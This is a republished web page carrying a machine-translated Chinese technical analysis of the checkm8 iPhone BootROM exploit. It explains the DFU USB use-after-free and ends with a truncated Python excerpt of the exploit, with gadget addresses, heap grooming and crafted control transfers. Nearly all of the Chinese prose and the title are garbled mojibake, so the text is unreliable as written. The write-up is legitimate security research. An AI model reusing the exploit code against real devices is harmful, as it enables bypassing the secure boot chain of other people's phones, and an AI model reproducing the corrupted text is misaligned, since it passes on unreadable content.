<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ğŸ™ƒ ğŸŒ° ğŸ‘‡ğŸ½ checkm8æ¼æ´åˆ©ç”¨çš„æŠ€æœ¯åˆ†æ ğŸ’‡ğŸ¼ ğŸ”» âš½ï¸</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="æ‚¨å¾ˆå¯èƒ½å·²ç»å¬è¯´è¿‡è‘—åçš„æ¼æ´åˆ©ç”¨æ£€æŸ¥ç¨‹åºm8 ï¼Œå®ƒåœ¨åŒ…æ‹¬iPhone Xåœ¨å†…çš„å¤§å¤šæ•°iDevicesçš„BootROMä¸­ä½¿ç”¨äº†ä¸å¯ä¿®å¤çš„æ¼æ´iPhone X åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†å¯¹æ­¤æ¼æ´è¿›è¡ŒæŠ€æœ¯åˆ†æï¼Œå¹¶æ‰¾å‡ºå¯¼è‡´æ¼æ´çš„åŸå› ã€‚ 


 æ‚¨å¯ä»¥åœ¨æ­¤å¤„é˜…è¯»ä¿„è¯­ç‰ˆæœ¬ã€‚ 
 å¼•è¨€ 


 é¦–å…ˆï¼Œè®©æˆ‘ä»¬ç®€è¦æè¿°iDev...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>checkm8æ¼æ´åˆ©ç”¨çš„æŠ€æœ¯åˆ†æ</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/472762/"><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br><p>æ‚¨å¾ˆå¯èƒ½å·²ç»å¬è¯´è¿‡è‘—åçš„æ¼æ´åˆ©ç”¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ£€æŸ¥ç¨‹åºm8</a> ï¼Œå®ƒåœ¨åŒ…æ‹¬<code>iPhone X</code>åœ¨å†…çš„å¤§å¤šæ•°iDevicesçš„<code>BootROM</code>ä¸­ä½¿ç”¨äº†<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ä¸å¯ä¿®å¤</a>çš„æ¼æ´<code>iPhone X</code> åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†å¯¹æ­¤æ¼æ´è¿›è¡ŒæŠ€æœ¯åˆ†æï¼Œå¹¶æ‰¾å‡ºå¯¼è‡´æ¼æ´çš„åŸå› ã€‚ </p><a name="habracut"></a><br><p> æ‚¨å¯ä»¥åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ­¤å¤„</a>é˜…è¯»ä¿„è¯­ç‰ˆæœ¬ã€‚ </p><br><h2 id="introduction"> å¼•è¨€ </h2><br><p> é¦–å…ˆï¼Œè®©æˆ‘ä»¬ç®€è¦æè¿°iDeviceçš„å¯åŠ¨è¿‡ç¨‹ä»¥åŠ<code>BootROM</code> ï¼ˆåˆå<code>SecureROM</code> ï¼‰åœ¨å…¶ä¸­æ‰®æ¼”çš„è§’è‰²ã€‚ å¯ä»¥åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ­¤å¤„</a>æ‰¾åˆ°æœ‰å…³å®ƒçš„è¯¦ç»†ä¿¡æ¯ã€‚ å¼•å¯¼å¦‚ä¸‹æ‰€ç¤ºï¼š </p><br><p><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br><p> è®¾å¤‡ä¸Šç”µæ—¶ï¼Œé¦–å…ˆæ‰§è¡Œ<code>BootROM</code> ã€‚ å…¶ä¸»è¦ä»»åŠ¡æ˜¯ï¼š </p><br><ul><li> å¹³å°åˆå§‹åŒ–ï¼ˆå·²å®‰è£…å¿…éœ€çš„å¹³å°å¯„å­˜å™¨ï¼Œåˆå§‹åŒ–äº†<code>CPU</code>ç­‰ï¼‰ </li><li> éªŒè¯å¹¶å°†æ§åˆ¶æƒè½¬ç§»åˆ°ä¸‹ä¸€é˜¶æ®µ <br><ul><li>  <code>BootROM</code>æ”¯æŒå¯¹<code>IMG3/IMG4</code>æ˜ åƒçš„è§£æ </li><li>  <code>BootROM</code>å¯ä»¥è®¿é—®ç”¨äºè§£å¯†æ˜ åƒçš„<code>GID</code>å¯†é’¥ </li><li> ä¸ºäº†è¿›è¡Œå›¾åƒéªŒè¯ï¼Œ <code>BootROM</code>å…·æœ‰å†…ç½®çš„å…¬å…±<code>Apple</code>å¯†é’¥å’Œå¿…è¦çš„åŠ å¯†åŠŸèƒ½ </li></ul></li><li> å¦‚æœæ— æ³•è¿›ä¸€æ­¥å¼•å¯¼ï¼Œè¯·è¿˜åŸè®¾å¤‡ï¼ˆ <code>Device Firmware Update</code> ï¼Œ <code>DFU</code> ï¼‰ã€‚ </li></ul><br><p>  <code>BootROM</code>çš„ä½“ç§¯éå¸¸å°ï¼Œå¯ä»¥ç§°ä¸º<code>iBoot</code>ç‰ˆï¼Œå› ä¸ºå®ƒä»¬å…±äº«å¤§å¤šæ•°ç³»ç»Ÿå’Œåº“ä»£ç ã€‚ å°½ç®¡ä¸<code>iBoot</code>ä¸åŒï¼Œ <code>BootROM</code>æ— æ³•æ›´æ–°ã€‚ åˆ¶é€ è®¾å¤‡æ—¶ï¼Œå®ƒå°†æ”¾å…¥å†…éƒ¨åªè¯»å­˜å‚¨å™¨ä¸­ã€‚  <code>BootROM</code>æ˜¯å®‰å…¨å¯åŠ¨é“¾ä¿¡ä»»çš„ç¡¬ä»¶æ ¹ã€‚  <code>BootROM</code>æ¼æ´å¯èƒ½ä½¿æ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶å¼•å¯¼è¿‡ç¨‹å¹¶åœ¨è®¾å¤‡ä¸Šæ‰§è¡Œæœªç­¾åçš„ä»£ç ã€‚ </p><br><p><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br><h2 id="the-history-of-checkm8">  checkm8çš„å†å² </h2><br><p>  <code>checkm8</code>æ¼æ´å·²ç”±å…¶ä½œè€…<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">axi0mX</a>äº2019å¹´9æœˆ27æ—¥æ·»åŠ åˆ°<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">ipwndfuä¸­</a> ã€‚ä¸æ­¤åŒæ—¶ï¼Œä»–åœ¨Twitterä¸Š<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">å®£å¸ƒ</a>äº†æ›´æ–°ï¼Œå¹¶æä¾›äº†æœ‰å…³æ­¤æ¼æ´çš„æè¿°å’Œå…¶ä»–ä¿¡æ¯ã€‚ æ ¹æ®çº¿ç´¢ï¼Œä»–åœ¨2018å¹´å¤å­£å¯¹<code>iBoot</code>è¿›è¡Œ<code>iOS 12 beta</code>è¡¥ä¸è¡¥ä¸æ—¶å‘ç°äº†<code>USB</code>ä»£ç ä¸­çš„After <code>use-after-free</code>æ¼æ´ã€‚ <br>  <code>BootROM</code>å’Œ<code>iBoot</code>å…±äº«å¤§å¤šæ•°ä»£ç ï¼ŒåŒ…æ‹¬<code>USB</code> ï¼Œå› æ­¤æ­¤æ¼æ´ä¹Ÿä¸<code>BootROM</code>æœ‰å…³ã€‚ </p><br><p> å¦‚æ¼æ´åˆ©ç”¨ä»£ç æ‰€ç¤ºï¼Œè¯¥æ¼æ´åœ¨<code>DFU</code>è¢«åˆ©ç”¨ã€‚ åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå¯ä»¥å°†ç­¾åçš„å›¾åƒé€šè¿‡<code>USB</code>ä¼ è¾“åˆ°è®¾å¤‡ï¼Œç¨åå†å¯åŠ¨ã€‚ ä¾‹å¦‚ï¼Œè¿™å¯¹äºåœ¨æ›´æ–°å¤±è´¥åæ¢å¤è®¾å¤‡å¾ˆæœ‰ç”¨ã€‚ </p><br><p> åŒä¸€å¤©ï¼Œç”¨æˆ·<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">littlelailo</a>è¡¨ç¤ºä»–æ—©åœ¨ä¸‰æœˆä»½å°±å‘ç°äº†è¯¥æ¼æ´ï¼Œå¹¶åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">apollo.txtä¸­</a>å‘å¸ƒäº†æè¿°ã€‚ è¯¥æè¿°ä¸<code>checkm8</code>ç›¸å¯¹åº”ï¼Œå°½ç®¡å¹¶éæ‰€æœ‰çš„åˆ©ç”¨ç»†èŠ‚åœ¨é˜…è¯»æ—¶éƒ½ä¼šå˜å¾—æ¸…æ¥šã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬å†³å®šå†™è¿™ç¯‡æ–‡ç« å¹¶æè¿°åœ¨<code>BootROM</code>æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ä¹‹å‰çš„æ‰€æœ‰åˆ©ç”¨ç»†èŠ‚ã€‚ </p><br><p> æˆ‘ä»¬åŸºäºä¸Šè¿°èµ„æºå’Œ<code>iBoot/SecureROM</code>çš„æºä»£ç å¯¹æ¼æ´åˆ©ç”¨è¿›è¡Œäº†åˆ†æï¼Œè¯¥æºä»£ç äº2018å¹´2æœˆæ³„æ¼ã€‚æˆ‘ä»¬è¿˜ä½¿ç”¨äº†åœ¨æµ‹è¯•è®¾å¤‡<code>iPhone 7</code> ï¼ˆ <code>CPID:8010</code>ä¸Šè¿›è¡Œçš„å®éªŒä¸­è·å¾—çš„æ•°æ®ï¼‰ ä½¿ç”¨<code>checkm8</code> ï¼Œæˆ‘ä»¬è·å¾—äº†<code>SecureROM</code>å’Œ<code>SecureRAM</code>çš„è½¬å‚¨ï¼Œè¿™ä¹Ÿæœ‰åŠ©äºåˆ†æã€‚ </p><br><h2 id="necessary-info-about-usb"> æœ‰å…³USBçš„å¿…è¦ä¿¡æ¯ </h2><br><p> ç”±äºè¯¥æ¼æ´ä½äº<code>USB</code>ä»£ç ä¸­ï¼Œå› æ­¤æœ‰å¿…è¦äº†è§£æ­¤æ¥å£çš„å·¥ä½œæ–¹å¼ã€‚ å®Œæ•´çš„è§„èŒƒå¯ä»¥åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://www.usb.org/</a>ä¸Šæ‰¾åˆ°ï¼Œä½†æ˜¯å®ƒè¯»èµ·æ¥å¾ˆé•¿ã€‚ å°±æˆ‘ä»¬çš„ç›®çš„è€Œè¨€ï¼Œ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">NutShellä¸­çš„USB</a>ç»°ç»°æœ‰ä½™ã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä»…æåŠæœ€ç›¸å…³çš„è¦ç‚¹ã€‚ </p><br><p>  <code>USB</code>æ•°æ®ä¼ è¾“æœ‰å¤šç§ç±»å‹ã€‚ åœ¨<code>DFU</code> ï¼Œä»…ä½¿ç”¨â€œ <code>Control Transfers</code>æ¨¡å¼ï¼ˆ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">åœ¨æ­¤å¤„</a>äº†è§£æ›´å¤šä¿¡æ¯ï¼‰ã€‚ åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œæ¯ä¸ªäº‹åŠ¡éƒ½æœ‰3ä¸ªé˜¶æ®µï¼š </p><br><a name="setup_packet"></a><br><ul><li>  <code>Setup Stage</code> -å‘é€<code>SETUP</code>æ•°æ®åŒ…ï¼› å®ƒå…·æœ‰ä»¥ä¸‹å­—æ®µï¼š <br><ul><li>  <code>bmRequestType</code>å®šä¹‰è¯·æ±‚çš„æ–¹å‘ï¼Œå…¶ç±»å‹å’Œæ¥æ”¶è€… </li><li>  <code>bRequest</code>å®šä¹‰è¦å‘å‡ºçš„è¯·æ±‚ </li><li>  <code>wValue</code> ï¼Œ <code>wIndex</code>æ ¹æ®è¯·æ±‚è¿›è¡Œè§£é‡Š </li><li>  <code>wLength</code>æŒ‡å®š<code>Data Stage</code>å‘é€/æ¥æ”¶çš„æ•°æ®çš„é•¿åº¦ </li></ul></li><li>  <code>Data Stage</code> -æ•°æ®ä¼ è¾“çš„å¯é€‰é˜¶æ®µã€‚ æ ¹æ®åœ¨<code>Setup Stage</code>å‘é€çš„<code>SETUP</code>æ•°æ®åŒ…ï¼Œæ•°æ®å¯ä»¥ä»ä¸»æœºå‘é€åˆ°è®¾å¤‡ï¼ˆ <code>OUT</code> ï¼‰ï¼Œåä¹‹äº¦ç„¶ï¼ˆ <code>IN</code> ï¼‰ã€‚ æ•°æ®æŒ‰å°éƒ¨åˆ†å‘é€ï¼ˆå¦‚æœä½¿ç”¨<code>Apple DFU</code> ï¼Œåˆ™ä¸º0x40å­—èŠ‚ï¼‰ã€‚ <br><ul><li> å½“ä¸»æœºè¦å‘é€å¦ä¸€éƒ¨åˆ†æ•°æ®æ—¶ï¼Œå®ƒå°†å‘é€ä¸€ä¸ª<code>OUT</code>ä»¤ç‰Œï¼Œç„¶åå‘é€æ•°æ®æœ¬èº«ã€‚ </li><li> å½“ä¸»æœºå‡†å¤‡å¥½ä»è®¾å¤‡æ¥æ”¶æ•°æ®æ—¶ï¼Œå®ƒå°†å‘è®¾å¤‡å‘é€<code>IN</code>ä»¤ç‰Œã€‚ </li></ul></li><li>  <code>Status Stage</code> -æœ€åé˜¶æ®µï¼› æŠ¥å‘Šæ•´ä¸ªäº¤æ˜“çš„çŠ¶æ€ã€‚ <br><ul><li> å¯¹äº<code>OUT</code>è¯·æ±‚ï¼Œä¸»æœºå‘é€ä¸€ä¸ª<code>IN</code>ä»¤ç‰Œï¼Œè®¾å¤‡å¿…é¡»ä»¥é›¶é•¿åº¦çš„æ•°æ®åŒ…å“åº”è¯¥ä»¤ç‰Œã€‚ </li><li> å¯¹äº<code>IN</code>è¯·æ±‚ï¼Œä¸»æœºå‘é€<code>OUT</code>ä»¤ç‰Œå’Œé›¶é•¿åº¦æ•°æ®åŒ…ã€‚ </li></ul></li></ul><br><p> ä¸‹é¢çš„æ–¹æ¡ˆæ˜¾ç¤ºäº†<code>OUT</code>å’Œ<code>IN</code>è¯·æ±‚ã€‚ æˆ‘ä»¬æ•…æ„å–å‡º<code>ACK</code> ï¼Œ <code>NACK</code>å’Œå…¶ä»–æ¡æ‰‹æ•°æ®åŒ…ï¼Œå› ä¸ºå®ƒä»¬å¯¹äºæ¼æ´åˆ©ç”¨æœ¬èº«å¹¶ä¸é‡è¦ã€‚ </p><br><p><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br><h2 id="analysis-of-apollotxt">  apollo.txtåˆ†æ </h2><br><p> æˆ‘ä»¬ä»<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">apollo.txtä¸­</a>çš„æ¼æ´å¼€å§‹åˆ†æã€‚ è¯¥æ–‡æ¡£æè¿°äº†<code>DFU</code>æ¨¡å¼çš„ç®—æ³•ï¼š </p><br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a> <br><ol><li> å½“USBå¼€å§‹é€šè¿‡dfuè·å–å›¾åƒæ—¶ï¼Œdfuæ³¨å†Œä¸€ä¸ªæ¥å£æ¥å¤„ç†æ‰€æœ‰å‘½ä»¤ï¼Œå¹¶ä¸ºè¾“å…¥å’Œè¾“å‡ºåˆ†é…ä¸€ä¸ªç¼“å†²åŒºã€‚ </li><li> å¦‚æœæ‚¨å°†æ•°æ®å‘é€åˆ°dfuï¼Œåˆ™è®¾ç½®åŒ…å°†ç”±ä¸»ä»£ç å¤„ç†ï¼Œç„¶åè°ƒå‡ºæ¥å£ä»£ç  </li><li> æ¥å£ä»£ç éªŒè¯wLengthçŸ­äºè¾“å…¥è¾“å‡ºç¼“å†²åŒºçš„é•¿åº¦ï¼Œå¦‚æœæ˜¯è¿™ç§æƒ…å†µï¼Œå®ƒå°†ä½¿ç”¨æŒ‡å‘è¾“å…¥è¾“å‡ºç¼“å†²åŒºçš„æŒ‡é’ˆæ›´æ–°ä½œä¸ºå‚æ•°ä¼ é€’çš„æŒ‡é’ˆ </li><li> ç„¶åè¿”å›wLengthï¼Œè¿™æ˜¯å®ƒè¦æ¥æ”¶åˆ°ç¼“å†²åŒºçš„é•¿åº¦ </li><li> ç„¶åï¼ŒUSBä¸»ä»£ç ä½¿ç”¨é•¿åº¦æ›´æ–°å…¨å±€å˜é‡ï¼Œå¹¶å‡†å¤‡å¥½æ¥æ”¶æ•°æ®åŒ… </li><li> å¦‚æœæ¥æ”¶åˆ°æ•°æ®åŒ…ï¼Œåˆ™é€šè¿‡ä½œä¸ºå‚æ•°ä¼ é€’çš„æŒ‡é’ˆå°†å…¶å†™å…¥è¾“å…¥è¾“å‡ºç¼“å†²åŒºï¼Œå¹¶ä½¿ç”¨å¦ä¸€ä¸ªå…¨å±€å˜é‡æ¥è·Ÿè¸ªå·²ç»æ¥æ”¶äº†å¤šå°‘å­—èŠ‚ </li><li> å¦‚æœæ¥æ”¶åˆ°æ‰€æœ‰æ•°æ®ï¼Œåˆ™å†æ¬¡è°ƒç”¨ç‰¹å®šäºdfuçš„ä»£ç ï¼Œç„¶åç»§ç»­å°†è¾“å…¥è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹å¤åˆ¶åˆ°ä»¥åä»ä¸­å¼•å¯¼æ˜ åƒçš„å†…å­˜ä½ç½® </li><li> ä¹‹åï¼Œusbä»£ç å°†é‡ç½®æ‰€æœ‰å˜é‡ï¼Œç„¶åç»§ç»­å¤„ç†æ–°è½¯ä»¶åŒ… </li><li> å¦‚æœdfué€€å‡ºï¼Œåˆ™é‡Šæ”¾è¾“å…¥è¾“å‡ºç¼“å†²åŒºï¼Œå¹¶ä¸”å¦‚æœæ˜ åƒè§£æå¤±è´¥ï¼Œåˆ™bootromé‡æ–°è¾“å…¥dfu </li></ol><br></blockquote><p> é¦–å…ˆï¼Œæˆ‘ä»¬å¯¹ç…§<code>iBoot</code>çš„æºä»£ç æ£€æŸ¥äº†è¿™äº›æ­¥éª¤ã€‚ æˆ‘ä»¬ä¸èƒ½åœ¨è¿™é‡Œä½¿ç”¨æ³„æ¼ä»£ç çš„ç‰‡æ®µï¼Œå› æ­¤æˆ‘ä»¬å°†ä½¿ç”¨ä»<code>IDA</code>ä¸­å¯¹<code>iPhone7</code>çš„<code>SecureROM</code>è¿›è¡Œåå‘å·¥ç¨‹å¾—åˆ°çš„ä¼ªä»£ç ã€‚ æ‚¨å¯ä»¥è½»æ¾æ‰¾åˆ°<code>iBoot</code>çš„æºä»£ç å¹¶è¿›è¡Œå¯¼èˆªã€‚ </p><br><p> åˆå§‹åŒ–<code>DFU</code> ï¼Œå°†åˆ†é…<code>IO</code>ç¼“å†²åŒºï¼Œå¹¶æ³¨å†Œç”¨äºå¤„ç†<code>DFU</code>è¯·æ±‚çš„<code>USB</code>æ¥å£ï¼š </p><br><p><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br><p> å½“å¯¹<code>DFU</code>çš„è¯·æ±‚çš„<code>SETUP</code>æ•°æ®åŒ…è¿›å…¥æ—¶ï¼Œå°†è°ƒç”¨é€‚å½“çš„æ¥å£å¤„ç†ç¨‹åºã€‚ å¯¹äº<code>OUT</code>è¯·æ±‚ï¼ˆä¾‹å¦‚ï¼Œå½“å‘é€å›¾åƒæ—¶ï¼‰ï¼Œåœ¨æˆåŠŸæ‰§è¡Œçš„æƒ…å†µä¸‹ï¼Œå¤„ç†ç¨‹åºå¿…é¡»è¿”å›<code>IO</code>ç¼“å†²åŒºçš„åœ°å€ä»¥è¿›è¡Œäº‹åŠ¡å¤„ç†ä»¥åŠå®ƒå¸Œæœ›æ¥æ”¶çš„æ•°æ®é•¿åº¦ã€‚ è¿™ä¸¤ä¸ªå€¼éƒ½å­˜å‚¨åœ¨å…¨å±€å˜é‡ä¸­ã€‚ </p><br><p><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br><p> ä¸‹é¢çš„å±å¹•æˆªå›¾æ˜¾ç¤ºäº†<code>DFU</code>æ¥å£å¤„ç†ç¨‹åºã€‚ å¦‚æœè¯·æ±‚æ­£ç¡®ï¼Œåˆ™è¿”å›åœ¨<code>DFU</code>åˆå§‹åŒ–æœŸé—´åˆ†é…çš„<code>IO</code>ç¼“å†²åŒºçš„åœ°å€å’Œ<code>SETUP</code>æ•°æ®åŒ…çš„é¢„æœŸæ•°æ®é•¿åº¦ã€‚ </p><br><p><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br><p> åœ¨<code>Data Stage</code> ï¼Œå°†<code>Data Stage</code>æ¯ä¸ªéƒ¨åˆ†å†™å…¥<code>IO</code>ç¼“å†²åŒºï¼Œç„¶å<code>IO</code>ç¼“å†²åŒºåœ°å€åç§»å¹¶æ›´æ–°æ¥æ”¶åˆ°çš„è®¡æ•°å™¨ã€‚ æ¥æ”¶åˆ°æ‰€æœ‰é¢„æœŸæ•°æ®åï¼Œå°†è°ƒç”¨æ¥å£æ•°æ®å¤„ç†ç¨‹åºï¼Œå¹¶æ¸…é™¤äº‹åŠ¡çš„å…¨å±€çŠ¶æ€ã€‚ </p><br><p><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br><p> åœ¨<code>DFU</code>æ•°æ®å¤„ç†ç¨‹åºä¸­ï¼Œå°†æ¥æ”¶åˆ°çš„æ•°æ®ç§»åˆ°å­˜å‚¨åŒºï¼Œä»¥åå†ä»è¯¥å­˜å‚¨åŒºä¸­åŠ è½½æ•°æ®ã€‚ æ ¹æ®<code>iBoot</code>çš„æºä»£ç ï¼Œ <code>Apple</code>è®¾å¤‡ä¸Šçš„è¯¥åŒºåŸŸç§°ä¸º<code>INSECURE_MEMORY</code> ã€‚ </p><br><p><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br><p> å½“è®¾å¤‡é€€å‡º<code>DFU</code>æ¨¡å¼æ—¶ï¼Œå…ˆå‰åˆ†é…çš„<code>IO</code>ç¼“å†²åŒºå°†è¢«é‡Šæ”¾ã€‚ å¦‚æœåœ¨<code>DFU</code>æ¨¡å¼ä¸‹æˆåŠŸè·å–äº†æ˜ åƒï¼Œåˆ™å°†å¯¹å…¶è¿›è¡ŒéªŒè¯å¹¶å¯åŠ¨ã€‚ å¦‚æœæœ‰ä»»ä½•é”™è¯¯æˆ–æ— æ³•å¼•å¯¼æ˜ åƒï¼Œåˆ™<code>DFU</code>å°†å†æ¬¡åˆå§‹åŒ–ï¼Œå¹¶ä¸”æ•´ä¸ªè¿‡ç¨‹å°†ä»å¤´å¼€å§‹é‡å¤ã€‚ </p><br><p> æ‰€æè¿°çš„ç®—æ³•å…·æœ‰â€œ <code>use-after-free</code>æ¼æ´ã€‚ å¦‚æœæˆ‘ä»¬åœ¨ä¸Šè½½å›¾åƒæ—¶å‘é€<code>SETUP</code>æ•°æ®åŒ…å¹¶å®Œæˆè·³è¿‡<code>Data Stage</code>çš„äº¤æ˜“ï¼Œåˆ™å…¨å±€çŠ¶æ€å°†åœ¨ä¸‹ä¸€ä¸ª<code>DFU</code>å‘¨æœŸå†…ä¿æŒåˆå§‹åŒ–çŠ¶æ€ï¼Œå¹¶ä¸”èƒ½å¤Ÿå†™å…¥ä¸Šä¸€ä¸ª<code>DFU</code>å‘¨æœŸä¸­åˆ†é…çš„<code>IO</code>ç¼“å†²åŒºçš„åœ°å€ã€‚ <code>DFU</code>è¿­ä»£ã€‚ </p><br><p> æ—¢ç„¶æˆ‘ä»¬çŸ¥é“<code>use-after-free</code>å·¥ä½œåŸç†ï¼Œé‚£ä¹ˆé—®é¢˜æ˜¯ï¼Œåœ¨<code>DFU</code>çš„ä¸‹ä¸€æ¬¡è¿­ä»£æœŸé—´å¦‚ä½•è¦†ç›–ä»»ä½•å†…å®¹ï¼Ÿ åœ¨å†æ¬¡åˆå§‹åŒ–<code>DFU</code>ä¹‹å‰ï¼Œå°†é‡Šæ”¾æ‰€æœ‰å…ˆå‰åˆ†é…çš„èµ„æºï¼Œå¹¶ä¸”æ–°è¿­ä»£ä¸­çš„å†…å­˜åˆ†é…å¿…é¡»å®Œå…¨ç›¸åŒã€‚ äº‹å®è¯æ˜ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªæœ‰è¶£çš„å†…å­˜æ³„æ¼é”™è¯¯ï¼Œå®ƒå…è®¸åˆ©ç”¨<code>use-after-free</code> ã€‚ </p><br><h2 id="analysis-of-checkm8">  checkm8åˆ†æ </h2><br><p> è®©æˆ‘ä»¬æ¥<code>checkm8</code>æœ¬èº«ã€‚ ä¸ºäº†æ¼”ç¤ºèµ·è§ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨<code>iPhone 7</code>æ¼æ´åˆ©ç”¨<code>iPhone 7</code>çš„ç®€åŒ–ç‰ˆæœ¬ï¼Œåœ¨å…¶ä¸­åˆ é™¤ä¸å…¶ä»–å¹³å°æœ‰å…³çš„æ‰€æœ‰ä»£ç ï¼Œå¹¶æ›´æ”¹<code>USB</code>è¯·æ±‚çš„é¡ºåºå’Œç±»å‹ï¼Œè€Œä¸ä¼šå¯¹å…¶åŠŸèƒ½é€ æˆä»»ä½•æŸå®³ã€‚ æˆ‘ä»¬è¿˜æ‘†è„±äº†æ„å»ºæœ‰æ•ˆè´Ÿè½½çš„è¿‡ç¨‹ï¼Œè¯¥è¿‡ç¨‹å¯ä»¥åœ¨åŸå§‹æ–‡ä»¶<code>checkm8.py</code> ã€‚ å¾ˆå®¹æ˜“å‘ç°å…¶ä»–è®¾å¤‡ç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚ã€‚ </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from checkm8 import * def main(): print '*** checkm8 exploit by axi0mX ***' device = dfu.acquire_device(1800) start = time.time() print 'Found:', device.serial_number if 'PWND:[' in device.serial_number: print 'Device is already in pwned DFU Mode. Not executing exploit.' return payload, _ = exploit_config(device.serial_number) t8010_nop_gadget = 0x10000CC6C callback_chain = 0x1800B0800 t8010_overwrite = '\0' * 0x5c0 t8010_overwrite += struct.pack('&lt;32x2Q', t8010_nop_gadget, callback_chain) # heap feng-shui stall(device) leak(device) for i in range(6): no_leak(device) dfu.usb_reset(device) dfu.release_device(device) # set global state and restart usb device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001) libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0) dfu.release_device(device) time.sleep(0.5) # heap occupation device = 